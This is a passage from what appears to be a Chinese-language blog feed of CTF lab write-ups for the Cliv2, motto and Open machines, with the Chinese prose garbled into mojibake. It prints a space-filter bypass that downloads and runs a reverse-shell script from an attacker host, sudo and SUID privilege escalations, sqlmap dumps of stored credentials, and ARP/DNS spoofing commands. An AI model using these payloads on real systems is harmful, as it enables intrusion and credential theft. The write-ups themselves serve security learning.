ns1.cliv2.dsz.          86400   IN      A       127.0.0.1
...
```

Â∞ÜÂèëÁé∞ÁöÑÊâÄÊúâÂ≠êÂüüÂêç‰∏ÄÂπ∂Ê∑ªÂä†Âà∞ `/etc/hosts` Êñá‰ª∂‰∏≠Ôºå‰ª•‰æøÂêéÁª≠ËÆøÈóÆ„ÄÇ

```bash
# Êõ¥Êñ∞ /etc/hosts Êñá‰ª∂
192.168.205.240 cliv2.dsz 3170a7.cliv2.dsz client.cliv2.dsz dev.cliv2.dsz ns1.cliv2.dsz
```

# **‰∫å„ÄÅÂàùÂßãËÆøÈóÆ**

## Web Ê∏óÈÄè (RCE)

Âú®Êé¢ÊµãÂèëÁé∞ÁöÑÂ≠êÂüüÂêç‰∏≠ÔºåËÆøÈóÆ `http://3170a7.cliv2.dsz/` ÂèëÁé∞‰∏Ä‰∏™ Web ÁªàÁ´ØÔºåËØ•ÁªàÁ´ØÂÖÅËÆ∏ÊâßË°åÁ≥ªÁªüÂëΩ‰ª§„ÄÇ

ÁªèËøáÊµãËØïÔºåÂêéÁ´ØÂØπËæìÂÖ•ËøõË°å‰∫ÜËøáÊª§ÔºåÁ¶ÅÊ≠¢‰∫ÜÁ©∫Ê†ºÂíå `-` Á≠âÁâπÊÆäÂ≠óÁ¨¶„ÄÇ‰∏∫‰∫ÜÁªïËøáÁ©∫Ê†ºÈôêÂà∂ÔºåÊàë‰ª¨ÂèØ‰ª•‰ΩøÁî® shell ÁöÑÂÜÖÈÉ®Â≠óÊÆµÂàÜÈöîÁ¨¶ `${IFS}` Êù•‰ª£Êõø„ÄÇ

**ÊîªÂáªÊ≠•È™§:**

1.  Âú®ÊîªÂáªÊú∫ (Kali) ‰∏äÂàõÂª∫‰∏Ä‰∏™ÂèçÂºπ shell ËÑöÊú¨ (`reverse.sh`)„ÄÇ
2.  Âú®ÊîªÂáªÊú∫‰∏äÂºÄÂêØ‰∏Ä‰∏™‰∏¥Êó∂ÁöÑ HTTP ÊúçÂä°Âô®Ôºà‰æãÂ¶Ç `python3 -m http.server 80`Ôºâ„ÄÇ
3.  Âú® Kali ‰∏äÂºÄÂêØ `netcat` ÁõëÂê¨„ÄÇ
4.  ÊûÑÈÄ†ÁªïËøáÁ©∫Ê†ºÈôêÂà∂ÁöÑÊÅ∂ÊÑèÂëΩ‰ª§Ôºå‰∏ãËΩΩÂπ∂ÊâßË°åÂèçÂºπ shell ËÑöÊú¨„ÄÇ

**ÊÅ∂ÊÑèÂëΩ‰ª§:**

```bash
cd${IFS}/tmp/;busybox${IFS}wget${IFS}192.168.205.128/reverse.sh;bash${IFS}reverse.sh
```

Âú® Web ÁªàÁ´ØÊâßË°å‰∏äËø∞ÂëΩ‰ª§ÂêéÔºåÊàêÂäüÂú®Êú¨Âú∞ `netcat` ÁõëÂê¨Âô®‰∏äÊé•Êî∂Âà∞‰∫ÜÊù•Ëá™ÁõÆÊ†áÊúçÂä°Âô®ÁöÑ `www-data` Áî®Êà∑ÂèçÂºπ shell„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.240] 53098
...
www-data@Cliv2:/tmp$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# **‰∏â„ÄÅÊùÉÈôêÊèêÂçá**

## 1. ‰ªé `www-data` Âà∞ `bitc0de`

Ëé∑ÂèñÂàùÂßã shell ÂêéÔºåÂú® `/home` ÁõÆÂΩï‰∏ãÂèëÁé∞‰∫ÜÁî®Êà∑ `bitc0de`„ÄÇËøõ‰∏ÄÊ≠•Ê£ÄÊü• `/home/bitc0de` ÁõÆÂΩïÔºåÂèëÁé∞‰∏Ä‰∏™Âêç‰∏∫ `...` ÁöÑÂèØÁñëÊñá‰ª∂„ÄÇ

```bash
www-data@Cliv2:/home/bitc0de$ ls -al
...
-rw-r--r-- 1 root    root      17 Jul 25 23:51 ...
-rw-r--r-- 1 root    root      44 Jul 25 22:35 user.txt
...
www-data@Cliv2:/home/bitc0de$ cat ...
MabEwReOmcpG!123
```

ËØªÂèñËØ•Êñá‰ª∂ÂÜÖÂÆπÔºåËé∑Âæó‰∫Ü‰∏Ä‰∏™ÂØÜÁ†Å `MabEwReOmcpG!123`„ÄÇÂêåÊó∂ÔºåÂèëÁé∞‰∫Ü `user.txt`ÔºåËØªÂèñÂêéËé∑ÂæóÁ¨¨‰∏Ä‰∏™ flag„ÄÇ

```bash
www-data@Cliv2:/home/bitc0de$ cat user.txt 
flag{user-60b725f10c9c85c70d97880dfe8191b3}
```

‰ΩøÁî®Ëé∑ÂèñÁöÑÂØÜÁ†ÅÔºåÊàêÂäüÂàáÊç¢Âà∞ `bitc0de` Áî®Êà∑„ÄÇ

```bash
www-data@Cliv2:/home/bitc0de$ su bitc0de
Password: MabEwReOmcpG!123
bitc0de@Cliv2:~$ id
uid=1000(bitc0de) gid=1000(bitc0de) groups=1000(bitc0de)
```

## 2. ‰ªé `bitc0de` Âà∞ `root`

Êàê‰∏∫ `bitc0de` Áî®Êà∑ÂêéÔºåÊâßË°å `sudo -l` ÂèëÁé∞ËØ•Áî®Êà∑ÂèØ‰ª•Êó†ÂØÜÁ†Å‰ª• `ALL` ÊùÉÈôêÊâßË°å `/usr/local/bin/hmvcli` ËÑöÊú¨„ÄÇ

```bash
bitc0de@Cliv2:~$ sudo -l
...
User bitc0de may run the following commands on Cliv2:
    (ALL) NOPASSWD: /usr/local/bin/hmvcli
```

ÂàÜÊûêËØ• Python ËÑöÊú¨ `/usr/local/bin/hmvcli` ÁöÑÊ∫ê‰ª£Á†ÅÔºåÂèëÁé∞ÂÖ∂‰∏≠‰∏ÄÊÆµÂ≠òÂú®ÂëΩ‰ª§Ê≥®ÂÖ•ÊºèÊ¥ûÔºö

```python
...
parser.add_argument('-c', '--config', action='store_true', help='Run the setup script to configure credentials')
args = vars(parser.parse_args())

if args['config']:
    print('[*] Ejecutando script de configuraci√≥n...')
    subprocess.run(['bash', 'setup.sh'])  
    sys.exit(0)
...
```

ÂΩì‰ΩøÁî® `-c` Êàñ `--config` ÂèÇÊï∞ËøêË°åÊ≠§ËÑöÊú¨Êó∂ÔºåÂÆÉ‰ºö‰ª• `root` ÊùÉÈôêÔºàÂõ†‰∏∫Êàë‰ª¨Áî®‰∫Ü `sudo`ÔºâÊâßË°åÂΩìÂâçÁõÆÂΩï‰∏ãÁöÑ `setup.sh` Êñá‰ª∂„ÄÇÊàë‰ª¨ÂèØ‰ª•Âà©Áî®Ëøô‰∏™ÈÄªËæëÊù•ÊâßË°å‰ªªÊÑèÂëΩ‰ª§„ÄÇ

**ÊèêÊùÉÊ≠•È™§:**

1.  Âú® `bitc0de` Áî®Êà∑ÊùÉÈôê‰∏ãÔºå‰∫é‰ªªÊÑèÂèØÂÜôÁõÆÂΩïÔºàÂ¶Ç `/home/bitc0de` Êàñ `/tmp`ÔºâÂàõÂª∫‰∏Ä‰∏™Âêç‰∏∫ `setup.sh` ÁöÑÊñá‰ª∂„ÄÇ
2.  Âú® `setup.sh` ‰∏≠ÂÜôÂÖ•ÊèêÊùÉÂëΩ‰ª§ÔºåËøôÈáåÊàë‰ª¨‰ΩøÁî® `chmod +s /bin/bash` ‰∏∫ `bash` Á®ãÂ∫èËÆæÁΩÆ SUID ‰ΩçÔºå‰ΩøÂÖ∂Âú®ÊâßË°åÊó∂Ëé∑ÂæóÊñá‰ª∂ÊâÄÊúâËÄÖÔºàÂç≥ `root`ÔºâÁöÑÊùÉÈôê„ÄÇ
3.  ‰ª• `sudo` ÊñπÂºèËøêË°å `hmvcli` ËÑöÊú¨Âπ∂Â∏¶‰∏ä `-c` ÂèÇÊï∞ÔºåËß¶ÂèëÊºèÊ¥û„ÄÇ
4.  ÊâßË°å `bash -p` ‰ª• root ÊùÉÈôêÂêØÂä®‰∏Ä‰∏™Êñ∞ÁöÑ shell„ÄÇ

```bash
bitc0de@Cliv2:~$ cd /home/bitc0de
bitc0de@Cliv2:~$ echo 'chmod +s /bin/bash' &gt; setup.sh
bitc0de@Cliv2:~$ sudo /usr/local/bin/hmvcli -c
[*] Ejecutando script de configuraci√≥n...
bitc0de@Cliv2:~$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
bitc0de@Cliv2:~$ bash -p
bash-5.0# id
uid=1000(bitc0de) gid=1000(bitc0de) euid=0(root) egid=0(root) groups=0(root),1000(bitc0de)
```

ÊàêÂäüËé∑Âèñ `root` ÊùÉÈôê„ÄÇ

# **Âõõ„ÄÅÂ§∫ÂèñÊóóÂ∏ú**

Ëé∑Âèñ `root` ÊùÉÈôêÂêéÔºåËØªÂèñÊúÄÁªàÁöÑ `root.txt` ÊóóÂ∏úÊñá‰ª∂„ÄÇ

```bash
bash-5.0# cat /root/root.txt 
flag{root-12f54a96f64443246930da001cafda8b}

bash-5.0# cat /home/bitc0de/user.txt 
flag{user-60b725f10c9c85c70d97880dfe8191b3}
```

Ëá≥Ê≠§ÔºåÊâÄÊúâÊóóÂ∏úÂùáÂ∑≤Â§∫ÂèñÔºåÊ∏óÈÄèÊµãËØïÂÆåÊàê„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Cliv2.html</guid><pubDate>Wed, 06 Aug 2025 00:52:16 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_motto</title><link>https://7r1UMPHK.github.io/post/nei-bu-_motto.html</link><description>![image-20250802195125109](http://7r1UMPHK.github.io/image/20250802195134238.webp)

# ‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ

## 1. ‰∏ªÊú∫ÂèëÁé∞

‰ΩøÁî® `arp-scan` ÂØπÊú¨Âú∞ÁΩëÁªúËøõË°åÊâ´ÊèèÔºåËØÜÂà´Âá∫ÁõÆÊ†á‰∏ªÊú∫ÁöÑ IP Âú∞ÂùÄ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l               
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
192.168.205.237 08:00:27:C5:BA:A3       PCS Systemtechnik/Oracle VirtualBox virtual NIC
...
```

**ÁõÆÊ†á‰∏ªÊú∫IPÔºö** `192.168.205.237`

## 2. Á´ØÂè£‰∏éÊúçÂä°Êâ´Êèè

‰ΩøÁî® `nmap` ÂØπÁõÆÊ†á‰∏ªÊú∫ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºå‰ª•ËØÜÂà´ÂºÄÊîæÁöÑÁ´ØÂè£ÂèäËøêË°åÁöÑÊúçÂä°„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p- 192.168.205.237
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.205.237
Host is up (0.0016s latency).
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9090/tcp open  zeus-admin
```

**Êâ´ÊèèÁªìÊûúÊ±áÊÄªÔºö**

| Á´ØÂè£     | Áä∂ÊÄÅ | ÊúçÂä°              | Êé®Êñ≠                                           |
| :------- | :--- | :---------------- | :--------------------------------------------- |
| 22/tcp   | open | ssh               | ËøúÁ®ãÁÆ°ÁêÜÊúçÂä°ÔºåÂèØÁî®‰∫éÂêéÁª≠ÁôªÂΩï                   |
| 80/tcp   | open | http              | Web ÊúçÂä°Ôºå‰∏∫‰∏Ä‰∏™ JavaScript Â∞èÊ∏∏ÊàèÔºåÊú™ÂèëÁé∞ÊºèÊ¥û |
| 9090/tcp | open | zeus-admin (http) | Âè¶‰∏Ä‰∏™ Web ÊúçÂä°ÔºåÊòØÊú¨Ê¨°ÊîªÂáªÁöÑ‰∏ªË¶ÅÂÖ•Âè£          |

# ‰∫å„ÄÅÂàùÂßãËÆøÈóÆ‰∏éÊºèÊ¥ûÂà©Áî®

## Web Ê∏óÈÄè (Port 9090): ‰∫åÈò∂ SQL Ê≥®ÂÖ•

### 1. ÊºèÊ¥ûÂèëÁé∞

ËÆøÈóÆ `http://192.168.205.237:9090`ÔºåÁªèËøáÊâãÂä®ÂäüËÉΩÊµãËØïÔºåÂèëÁé∞ËØ• Web Â∫îÁî®Â≠òÂú®‰∏§‰∏™ÂÖ≥ÈîÆÈ°µÈù¢Ôºö
*   `/myinfo`ÔºöÂÖÅËÆ∏Â∑≤ËÆ§ËØÅÁî®Êà∑‰øÆÊîπËá™Â∑±ÁöÑÊòµÁß∞ (`nickname`)„ÄÇ
*   `/mymottos`ÔºöÊòæÁ§∫Áî®Êà∑ÁöÑÊòµÁß∞ÂíåÂ∫ßÂè≥Èì≠‰ø°ÊÅØ„ÄÇ

ÊµãËØïÂèëÁé∞ÔºåÂú® `/myinfo` È°µÈù¢Êèê‰∫§ÁöÑ `nickname` ÂèÇÊï∞Êú™ÁªèËøáÊª§Â∞±Â≠òÂÖ•‰∫ÜÊï∞ÊçÆÂ∫ì„ÄÇÂΩìÁî®Êà∑ËÆøÈóÆ `/mymottos` È°µÈù¢Êó∂ÔºåÁ≥ªÁªü‰ªéÊï∞ÊçÆÂ∫ì‰∏≠ËØªÂèñËØ•ÊòµÁß∞Âπ∂ÊãºÊé•Âà∞ SQL Êü•ËØ¢‰∏≠Ôºå‰ªéËÄåËß¶Âèë‰∫Ü SQL Ê≥®ÂÖ•„ÄÇËøôÊòØ‰∏Ä‰∏™ÂÖ∏ÂûãÁöÑ**‰∫åÈò∂ SQL Ê≥®ÂÖ• (Second-Order SQL Injection)**„ÄÇ

### 2. sqlmap ÊºèÊ¥ûÂà©Áî®

Áî±‰∫éËØ•Ê≥®ÂÖ•ÈúÄË¶ÅÂÖàÂú®‰∏Ä‰∏™È°µÈù¢Ôºà`/myinfo`ÔºâÊèê‰∫§ PayloadÔºåÁÑ∂ÂêéÂú®Âè¶‰∏Ä‰∏™È°µÈù¢Ôºà`/mymottos`ÔºâËßÇÂØüÁªìÊûúÔºåÂõ†Ê≠§ÈúÄË¶Å‰ΩøÁî® `sqlmap` ÁöÑ `--second-url` ÂèÇÊï∞ËøõË°åËá™Âä®ÂåñÂà©Áî®„ÄÇÂêåÊó∂ÔºåÊâÄÊúâËØ∑Ê±ÇÈÉΩÈúÄË¶ÅÊúâÊïàÁöÑ JWT Cookie ËøõË°åË∫´‰ªΩÈ™åËØÅÔºåÂèØ‰ª•ÈÄöËøáÊäìÂèñ‰∏Ä‰∏™ÂêàÊ≥ïÁöÑËØ∑Ê±ÇÂåÖÂπ∂‰ΩøÁî® `-r` ÂèÇÊï∞Âä†ËΩΩ„ÄÇ

**`sqlmap` Âà©Áî®Ê≠•È™§Ôºö**

1.  **ÊäìÂèñËØ∑Ê±ÇÂåÖ**Ôºö‰ΩøÁî® Burp Suite Á≠âÂ∑•ÂÖ∑ÊäìÂèñ‰∏Ä‰∏™‰ªé `/myinfo` È°µÈù¢‰øÆÊîπÊòµÁß∞ÁöÑ POST ËØ∑Ê±ÇÔºåÂπ∂‰øùÂ≠ò‰∏∫ `1.txt`„ÄÇ

2.  **Ëé∑ÂèñÊï∞ÊçÆÂ∫ì‰ø°ÊÅØ**Ôºö
    ```bash
    sqlmap -r 1.txt --batch --second-url 'http://192.168.205.237:9090/mymottos' --dbs
    ```

3.  **Ëé∑ÂèñË°®‰ø°ÊÅØ**Ôºö
    ```bash
    sqlmap -r 1.txt --batch --second-url 'http://192.168.205.237:9090/mymottos' -D sql --tables
    ```

4.  **ËΩ¨ÂÇ®Âá≠ËØÅÊï∞ÊçÆ**Ôºö‰ªé `register_infos` Ë°®‰∏≠ËΩ¨ÂÇ®Áî®Êà∑Âá≠ËØÅ„ÄÇ
    ```bash
    sqlmap -r 1.txt --batch --second-url 'http://192.168.205.237:9090/mymottos' -D sql -T register_infos --dump
    ```

ÈÄöËøá‰∏äËø∞Êìç‰ΩúÔºåÊàêÂäüËé∑ÂèñÂà∞Áî®Êà∑ `redbean` ÁöÑ SSH ÁôªÂΩïÂá≠ËØÅ„ÄÇ

### 3. Ëé∑ÂèñÂàùÂßãËÆøÈóÆ Shell

‰ΩøÁî®Ëé∑ÂèñÂà∞ÁöÑÂá≠ËØÅÔºåÊàêÂäüÈÄöËøá SSH ÁôªÂΩïÂà∞ÁõÆÊ†á‰∏ªÊú∫„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp]
‚îî‚îÄ$ ssh redbean@192.168.205.237
...
redbean@motto:~$ id
uid=1001(redbean) gid=1001(redbean) groups=1001(redbean)
```

---

# ‰∏â„ÄÅÊùÉÈôêÊèêÂçá

## 1. SUID Êñá‰ª∂ÂèëÁé∞‰∏é‰ª£Á†ÅÂÆ°ËÆ°

ÁôªÂΩïÂêéÔºåÈ¶ñÂÖàÊêúÁ¥¢Á≥ªÁªü‰∏≠ÁöÑ SUID Êñá‰ª∂‰ª•ÂØªÊâæÊèêÊùÉÂêëÈáèÔºåÂèëÁé∞‰∏Ä‰∏™ÈùûÊ†áÂáÜÁöÑÁ®ãÂ∫è `/opt/run_newsh`„ÄÇ

```bash
redbean@motto:~$ find / -perm -4000 -type f 2&gt;/dev/null
...
/opt/run_newsh
...
```

Âú® `redbean` ÁöÑÂÆ∂ÁõÆÂΩï‰∏≠ÂèëÁé∞‰∫Ü‰∏Ä‰∏™ `.backup` Êñá‰ª∂Â§πÔºåÂÖ∂‰∏≠ÂåÖÂê´‰∫Ü `run_newsh.c` Âíå `new.sh` ÁöÑÊ∫ê‰ª£Á†ÅÔºå‰∏îÊñá‰ª∂ÂèØËØª„ÄÇ

*   **`run_newsh.c`**ÔºöÊ≠§ C Á®ãÂ∫èÁöÑÂäüËÉΩÊòØËÆæÁΩÆÊúâÊïàÁî®Êà∑ID‰∏∫ root (`setuid(0)`)ÔºåÁÑ∂ÂêéÊâßË°å `/opt/newsh` ËÑöÊú¨ÔºåÂπ∂Â∞ÜÂëΩ‰ª§Ë°å‰º†ÂÖ•ÁöÑÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ (`argv[1]`) ‰º†ÈÄíÁªôËØ•ËÑöÊú¨„ÄÇ
*   **`new.sh`**ÔºöËÑöÊú¨ÁöÑÊ†∏ÂøÉÈÄªËæëÂ¶Ç‰∏ãÔºö
    ```bash
    [ '$1' = 'flag' ] &amp;&amp; exit 2
    [ $1 = 'flag' ] &amp;&amp; chmod +s /bin/bash 
    ```

## 2. ÊºèÊ¥ûÂàÜÊûêÔºöShell Ë∑ØÂæÑÂêçÊâ©Â±ï

‰∏äËø∞ËÑöÊú¨‰∏≠Â≠òÂú®‰∏Ä‰∏™ÁªèÂÖ∏ÁöÑÂÆâÂÖ®ÊºèÊ¥ûÔºö
*   **Á¨¨‰∏ÄË°å `[ '$1' = 'flag' ]`**Ôºö‰ΩøÁî®‰∫ÜÂèåÂºïÂè∑ÂåÖË£πÂèòÈáè `$1`ÔºåËøô‰ºöÂ∞ÜÂÖ∂ËßÜ‰∏∫‰∏Ä‰∏™ÂÆåÊï¥ÁöÑÂ≠óÁ¨¶‰∏≤„ÄÇÂõ†Ê≠§Ôºå`'f*g'` ‰∏ç‰ºöÁ≠â‰∫é `'flag'`ÔºåÊ£ÄÊü•‰ºöÂ§±Ë¥•ÔºåËÑöÊú¨ÁªßÁª≠ÊâßË°å„ÄÇ
*   **Á¨¨‰∫åË°å `[ $1 = 'flag' ]`**Ôºö**Ê≤°Êúâ‰ΩøÁî®ÂèåÂºïÂè∑**„ÄÇÂΩì `$1` ÁöÑÂÄºÂåÖÂê´ÈÄöÈÖçÁ¨¶ÔºàÂ¶Ç `*` Êàñ `?`ÔºâÊó∂ÔºåShell ‰ºöÂú®ÊâßË°å `[` (test) ÂëΩ‰ª§ÂâçËøõË°å**Ë∑ØÂæÑÂêçÊâ©Â±ï**„ÄÇÂ¶ÇÊûúÂΩìÂâçÁõÆÂΩï‰∏ãÂ≠òÂú®‰∏Ä‰∏™Âêç‰∏∫ `flag` ÁöÑÊñá‰ª∂ÔºåÈÇ£‰πà `f*g` Â∞±‰ºöË¢´Êâ©Â±ï‰∏∫ `flag`ÔºåÂØºËá¥ `[ flag = flag ]` ÁöÑÂà§Êñ≠‰∏∫Áúü„ÄÇ

## 3. ÊºèÊ¥ûÂà©Áî®

Âà©Áî®Ê≠§ÁâπÊÄßÔºåÂèØ‰ª•ÈÄöËøá‰ª•‰∏ãÊ≠•È™§‰∏∫ `/bin/bash` Ê∑ªÂä† SUID ‰ΩçÔºö

1.  **ÂàáÊç¢Âà∞ÂèØÂÜôÁõÆÂΩï**ÔºöÂàáÊç¢Âà∞ `/tmp` ÁõÆÂΩïÔºå‰ª•Á°Æ‰øùÊàë‰ª¨ÊúâÊùÉÈôêÂàõÂª∫Êñá‰ª∂ÔºåÂπ∂‰∏îÈÅøÂÖçÂπ≤Êâ∞ÂÖ∂‰ªñÁõÆÂΩïÁªìÊûÑ„ÄÇ
    ```bash
    redbean@motto:~$ cd /tmp
    ```

2.  **ÂàõÂª∫Ëß¶ÂèëÊñá‰ª∂**ÔºöÂàõÂª∫‰∏Ä‰∏™Âêç‰∏∫ `flag` ÁöÑÊñá‰ª∂Ôºå‰∏∫Ë∑ØÂæÑÂêçÊâ©Â±ïÊèê‰æõÂåπÈÖçÁõÆÊ†á„ÄÇ
    ```bash
    redbean@motto:/tmp$ touch flag
    ```

3.  **ÊâßË°åSUIDÁ®ãÂ∫è**Ôºö‰ΩøÁî®‰∏Ä‰∏™ËÉΩÂåπÈÖçÂà∞ `flag` Êñá‰ª∂ÁöÑÈÄöÈÖçÁ¨¶ÔºàÂ¶Ç `f*g`Ôºâ‰Ωú‰∏∫ÂèÇÊï∞ÊâßË°å `/opt/run_newsh`„ÄÇ
    ```bash
    redbean@motto:/tmp$ /opt/run_newsh 'f*g'
    ```
    Ê≠§ÂëΩ‰ª§ÊàêÂäüÁªïËøá‰∫ÜÁ¨¨‰∏ÄË°åÊ£ÄÊü•ÔºåÂπ∂Âú®Á¨¨‰∫åË°åÊ£ÄÊü•Êó∂Ëß¶Âèë‰∫ÜË∑ØÂæÑÂêçÊâ©Â±ïÔºåÊâßË°å‰∫Ü `chmod +s /bin/bash`„ÄÇ

4.  **È™åËØÅÂπ∂Ëé∑Âèñ Root Shell**ÔºöÊ£ÄÊü• `/bin/bash` ÁöÑÊùÉÈôêÔºåÁ°ÆËÆ§Â∑≤ËÆæÁΩÆ SUID ‰Ωç„ÄÇÁÑ∂Âêé‰ΩøÁî® `-p` ÂèÇÊï∞ÂêØÂä® `bash` ‰ª•‰øùÁïô `euid`ÔºàÊúâÊïàÁî®Êà∑IDÔºâ‰∏∫ root„ÄÇ
    ```bash
    redbean@motto:/tmp$ ls -al /bin/bash
    -rwsr-xr-x 1 root root 1168776 ... /bin/bash
    
    redbean@motto:/tmp$ bash -p
    bash-5.0# id
    uid=1001(redbean) gid=1001(redbean) euid=0(root) groups=1001(redbean)
    bash-5.0# whoami
    root
    ```
    ÊàêÂäüËé∑Âèñ root ÊùÉÈôêÁöÑ shell„ÄÇ

---

# Âõõ„ÄÅÂ§∫ÂèñÊóóÂ∏ú

Ëé∑Âèñ root ÊùÉÈôêÂêéÔºåËØªÂèñ‰Ωç‰∫éÁî®Êà∑ÂÆ∂ÁõÆÂΩïÂíå root ÁõÆÂΩï‰∏ãÁöÑÊóóÂ∏úÊñá‰ª∂„ÄÇ

```bash
root@motto:/# cat /home/redbean/user.txt
flag{user-flag-placeholder-for-motto-user}

root@motto:/# cat /root/root.txt
flag{root-flag-placeholder-for-motto-root}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_motto.html</guid><pubDate>Wed, 06 Aug 2025 00:52:05 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_Open</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Open.html</link><description>![image-20250803185538640](http://7r1UMPHK.github.io/image/20250803185538981.webp)

# **‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ**

## 1. ‰∏ªÊú∫ÂèëÁé∞

‰ΩøÁî® `arp-scan` Âú®Êú¨Âú∞ÁΩëÁªúËøõË°åÊâ´ÊèèÔºåÂèëÁé∞ÁõÆÊ†á‰∏ªÊú∫ IP Âú∞ÂùÄ‰∏∫ `192.168.205.239`„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.239 08:00:27:3b:0f:b3       (Unknown)
...
```

## 2. Á´ØÂè£‰∏éÊúçÂä°Êâ´Êèè

ÈÄöËøá `nmap` ÂØπÁõÆÊ†á‰∏ªÊú∫ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºåÁ°ÆËÆ§ÂÖ∂ÂºÄÊîæ‰∫Ü 22 (SSH) Âíå 80 (HTTP) Á´ØÂè£„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nmap -p- 192.168.205.239
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## 3. Web ÊúçÂä°‰æ¶ÂØü

Áõ¥Êé•ËÆøÈóÆÁõÆÊ†á IP ‰ºöËá™Âä®ÈáçÂÆöÂêëÂà∞ÂüüÂêç `open.dsz`„ÄÇÂõ†Ê≠§ÔºåÈ¶ñÂÖàÂú®ÊîªÂáªÊú∫‰∏äÈÖçÁΩÆ `/etc/hosts` Êñá‰ª∂ÔºåÂ∞ÜËØ•ÂüüÂêçÊåáÂêëÁõÆÊ†á IP„ÄÇ

```bash
# /etc/hosts Êñá‰ª∂‰∏≠Ê∑ªÂä†
192.168.205.239 open.dsz
```

Êé•ÁùÄ‰ΩøÁî® `gobuster` ËøõË°åÁõÆÂΩïÊûö‰∏æÔºåÂèëÁé∞‰∫Ü `info.txt` Âíå `info.php` Êñá‰ª∂„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ gobuster dir -u http://open.dsz -w ...
...
/index.php            (Status: 200)
/info.txt             (Status: 200)
/info.php             (Status: 200)
...
```

Êü•Áúã `info.txt` ÁöÑÂÜÖÂÆπÂèëÁé∞ÂÆÉÂåÖÂê´ PHP ‰ª£Á†ÅÔºåËøôÊöóÁ§∫ÊúçÂä°Âô®ÂèØËÉΩÂ≠òÂú®Êñá‰ª∂ÂåÖÂê´ÊàñËß£ÊûêÊºèÊ¥û„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl http://open.dsz/info.txt              
&lt;?php phpinfo();?&gt;
```

# **‰∫å„ÄÅÂàùÂßãËÆøÈóÆ**

## Web Ê∏óÈÄè (SSRF)

ÁΩëÁ´ô‰∏ªÈ°µÊèê‰æõ‰∫Ü‰∏Ä‰∏™ÂäüËÉΩÔºåÂÖÅËÆ∏ÈÄöËøá URL ÂèÇÊï∞ `?url=` Êù•Âä†ËΩΩÊåáÂÆöÁöÑÈ°µÈù¢„ÄÇ

![image-20250803190055070](http://7r1UMPHK.github.io/image/20250803190055290.webp)

ÁªèËøáÊµãËØïÔºåÂèëÁé∞ÂêéÁ´ØÂØπ URL ËøõË°å‰∫ÜÈôêÂà∂ÔºåÂè™ÂÖÅËÆ∏Âä†ËΩΩ‰ª• `http://open` ÂºÄÂ§¥ÁöÑÂú∞ÂùÄÔºåÂπ∂‰∏î‰ºöËß£Êûê`info.txt `ÔºåÈÇ£Â∞±Êúâ‰∏Ä‰∏™‰ΩúÂºäÁöÑÊñπÊ≥ï

```bash
sudo bettercap
set arp.spoof.targets 192.168.205.239
set dns.spoof.domains http://open.cnm
set dns.spoof.address 192.168.205.128
arp.spoof on
dns.spoof on
```

DNSÂä´ÊåÅ,ÁÑ∂ÂêéÊåÇ‰∏Ä‰∏™ÂèçÂºπshellÊúçÂä°

ÂΩìÁÑ∂ËøôÊòØ‰ΩúÂºäÁöÑÊñπÊ≥ïÔºåÊ≠£Â∏∏ÁöÑÊÄùË∑ØÊòØËøô‰∏™ËøáÊª§Êú∫Âà∂ÂèØ‰ª•ÈÄöËøáÂú® URL ‰∏≠‰ΩøÁî® `@` Á¨¶Âè∑Êù•ÁªïËøáÔºåËøôÊòØ‰∏ÄÁßçÂÖ∏ÂûãÁöÑÊúçÂä°Âô®Á´ØËØ∑Ê±Ç‰º™ÈÄ† (SSRF) ÊºèÊ¥û„ÄÇÊàë‰ª¨ÂèØ‰ª•Âà©Áî®Ê≠§ÊºèÊ¥ûÔºå‰ΩøÊúçÂä°Âô®ËØ∑Ê±ÇÂπ∂ÊâßË°åÊàë‰ª¨ÊâòÁÆ°ÁöÑÊÅ∂ÊÑèÊñá‰ª∂„ÄÇ

**ÊîªÂáªÊ≠•È™§:**
1.  Âú®ÊîªÂáªÊú∫ (Kali) ‰∏äÂàõÂª∫‰∏Ä‰∏™ÂèçÂºπ shell ÁöÑ PHP Êñá‰ª∂ (`reverse.php`)„ÄÇ
2.  Âú®ÊîªÂáªÊú∫‰∏äÂºÄÂêØ‰∏Ä‰∏™‰∏¥Êó∂ÁöÑ HTTP ÊúçÂä°Âô®„ÄÇ
